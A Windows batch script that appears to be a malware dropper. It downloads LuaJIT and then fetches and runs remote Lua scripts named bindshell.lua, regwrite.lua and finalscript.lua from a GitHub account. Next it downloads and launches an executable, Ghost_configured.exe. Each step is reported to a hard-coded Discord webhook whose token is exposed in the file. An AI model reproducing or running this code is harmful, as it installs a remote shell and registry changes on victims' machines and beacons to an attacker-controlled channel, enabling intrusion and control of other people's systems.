@echo off
setlocal

REM Define paths and URLs
set "baseDir=%TEMP%\ZZ"
set "luaZip=%baseDir%\lua-5.4.2_Win64_bin.zip"
set "luaZipUrl=https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
set "luaJitZip=%baseDir%\LuaJIT-2.1.zip"
set "luaJitUrl=https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
set "bindshellScriptUrl=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
set "regwriteScriptUrl=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/regwrite.lua"
set "finalScriptUrl=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/finalscript.lua"
set "ghostConfigExeUrl=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/Ghost_configured.exe"
set "bindshellScriptPath=%baseDir%\bindshell.lua"
set "regwriteScriptPath=%baseDir%\regwrite.lua"
set "finalScriptPath=%baseDir%\finalscript.lua"
set "ghostConfigExePath=%baseDir%\Ghost_configured.exe"
set "luaJitPath=%baseDir%\LuaJIT-2.1"
set "luaPathDir=%baseDir%\Luapath"
set "jitDir=%luaPathDir%\src\jit"
set "srcDir=%luaPathDir%\src"
set "jitSourceDir=%luaJitPath%"
set "discordWebhookUrl=https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"

REM Function to send messages to Discord webhook using curl
:SendToDiscord
setlocal
set "message=%~1"
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%message%\"}" %discordWebhookUrl%
endlocal
goto :eof

REM Function to download files using curl
:DownloadFile
setlocal
set "url=%~1"
set "destination=%~2"
curl -L -o "%destination%" "%url%"
call :SendToDiscord "Downloaded: %url%"
endlocal
goto :eof

REM Create the base directory if it doesn't exist
if not exist "%baseDir%" (
    mkdir "%baseDir%"
    call :SendToDiscord "Created base directory: %baseDir%"
    timeout /t 5 /nobreak >nul
)

REM Download and extract LuaJIT if not already done
if not exist "%luaJitPath%\src\luajit.exe" (
    call :SendToDiscord "Getting LuaJIT ZIP file..."
    if not exist "%luaJitZip%" (
        call :DownloadFile "%luaJitUrl%" "%luaJitZip%"
        timeout /t 5 /nobreak >nul
    )
    call :SendToDiscord "Extracting LuaJIT ZIP file..."
    tar -xf "%luaJitZip%" -C "%baseDir%"
    timeout /t 5 /nobreak >nul
)

REM Download and extract Lua if not already done
if not exist "%baseDir%\lua54.exe" (
    call :SendToDiscord "Getting Lua ZIP file..."
    if not exist "%luaZip%" (
        call :DownloadFile "%luaZipUrl%" "%luaZip%"
        timeout /t 5 /nobreak >nul
    )
    call :SendToDiscord "Extracting Lua ZIP file..."
    tar -xf "%luaZip%" -C "%baseDir%"
    timeout /t 5 /nobreak >nul
)

REM Create necessary directories for LuaJIT
if not exist "%srcDir%" mkdir "%srcDir%"
if not exist "%jitDir%" mkdir "%jitDir%"

REM Copy LuaJIT JIT files
if exist "%jitSourceDir%" (
    xcopy "%jitSourceDir%\*" "%jitDir%" /s /y
    timeout /t 5 /nobreak >nul
) else (
    call :SendToDiscord "JIT source directory does not exist: %jitSourceDir%"
    exit /b 1
)

REM Copy luajit.exe and lua51.dll to Luapath base directory
if exist "%luaJitPath%\src\luajit.exe" (
    copy "%luaJitPath%\src\luajit.exe" "%luaPathDir%\luajit.exe" /y
    timeout /t 5 /nobreak >nul
) else (
    call :SendToDiscord "luajit.exe does not exist in the source directory: %luaJitPath%\src"
    exit /b 1
)

if exist "%luaJitPath%\src\lua51.dll" (
    copy "%luaJitPath%\src\lua51.dll" "%luaPathDir%\lua51.dll" /y
    timeout /t 5 /nobreak >nul
) else (
    call :SendToDiscord "lua51.dll does not exist in the source directory: %luaJitPath%\src"
    exit /b 1
)

REM Download the Lua scripts
call :SendToDiscord "Downloading Lua scripts..."
call :DownloadFile "%bindshellScriptUrl%" "%bindshellScriptPath%"
call :DownloadFile "%regwriteScriptUrl%" "%regwriteScriptPath%"
call :DownloadFile "%finalScriptUrl%" "%finalScriptPath%"

REM Execute Lua scripts using LuaJIT
call :SendToDiscord "Executing bindshell.lua using LuaJIT..."
"%luaPathDir%\luajit.exe" "%bindshellScriptPath%"
if errorlevel 1 (
    call :SendToDiscord "Error executing bindshell.lua"
    exit /b 1
)

call :SendToDiscord "Executing regwrite.lua using LuaJIT..."
"%luaPathDir%\luajit.exe" "%regwriteScriptPath%"
if errorlevel 1 (
    call :SendToDiscord "Error executing regwrite.lua"
    exit /b 1
)

call :SendToDiscord "Executing finalscript.lua using LuaJIT..."
"%luaPathDir%\luajit.exe" "%finalScriptPath%"
if errorlevel 1 (
    call :SendToDiscord "Error executing finalscript.lua"
    exit /b 1
)

REM Download and execute Ghost_configured.exe
call :SendToDiscord "Downloading Ghost_configured.exe..."
call :DownloadFile "%ghostConfigExeUrl%" "%ghostConfigExePath%"

call :SendToDiscord "Executing Ghost_configured.exe..."
start "" "%ghostConfigExePath%"
if errorlevel 1 (
    call :SendToDiscord "Error executing Ghost_configured.exe"
    exit /b 1
)

endlocal
